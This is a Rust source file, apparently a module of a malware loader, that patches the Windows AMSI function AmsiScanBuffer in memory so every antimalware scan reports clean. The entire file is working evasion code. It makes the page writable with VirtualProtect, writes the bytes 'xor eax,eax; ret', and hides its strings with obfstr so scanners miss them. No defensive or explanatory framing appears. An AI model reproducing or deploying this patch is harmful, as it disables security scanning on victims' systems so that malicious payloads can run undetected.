//! bypass/amsi.rs — in-process AMSI patch
//!
//! Resolves AmsiScanBuffer inside the current process and overwrites its
//! prologue with a "xor eax, eax; ret" stub so every scan returns
//! AMSI_RESULT_CLEAN (0) without executing the real scanner.
//!
//! Technique:
//!   1. LoadLibraryA("amsi.dll")           — load or locate the module
//!   2. GetProcAddress(_, "AmsiScanBuffer") — get function address
//!   3. VirtualProtect(addr, PAGE_EXECUTE_READWRITE)
//!   4. Write patch bytes: 33 C0 C3  (xor eax,eax; ret)
//!   5. VirtualProtect(addr, original protection)
//!
//! String arguments are stored as obfuscated byte arrays via `obfstr` and
//! decoded on the stack at runtime — no plaintext in .rdata.

use obfstr::obfstr;
use windows_sys::Win32::{
    Foundation::BOOL,
    System::{
        LibraryLoader::{GetProcAddress, LoadLibraryA},
        Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS},
    },
};

/// Patch AmsiScanBuffer in the current process.
///
/// Returns `Ok(())` on success, or `Err` with a description string.
/// Failure is non-fatal for the loader — log and continue.
pub fn patch() -> Result<(), &'static str> {
    // Decode obfuscated strings onto the stack before entering unsafe.
    // obfstr! returns a temporary; collect into Vec<u8> to extend lifetime.
    let dll_name: Vec<u8>  = obfstr!("amsi.dll\0").bytes().collect();
    let func_name: Vec<u8> = obfstr!("AmsiScanBuffer\0").bytes().collect();

    unsafe {
        let h_amsi = LoadLibraryA(dll_name.as_ptr());
        if h_amsi == 0 {
            // AMSI not loaded (e.g. non-AMSI context) — treat as success
            return Ok(());
        }

        let proc = GetProcAddress(h_amsi, func_name.as_ptr());
        let addr = match proc {
            Some(f) => f as *mut u8,
            None    => return Err("AmsiScanBuffer not found"),
        };

        // Make the page writable
        let mut old_protect: PAGE_PROTECTION_FLAGS = 0;
        let ok: BOOL = VirtualProtect(
            addr as *const _,
            8,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        );
        if ok == 0 {
            return Err("VirtualProtect (RWX) failed for AMSI patch");
        }

        // xor eax, eax  (33 C0)
        // ret           (C3)
        addr.write(0x33);
        addr.add(1).write(0xC0);
        addr.add(2).write(0xC3);

        // Restore original protection
        let _: BOOL = VirtualProtect(
            addr as *const _,
            8,
            old_protect,
            &mut old_protect,
        );

        Ok(())
    }
}
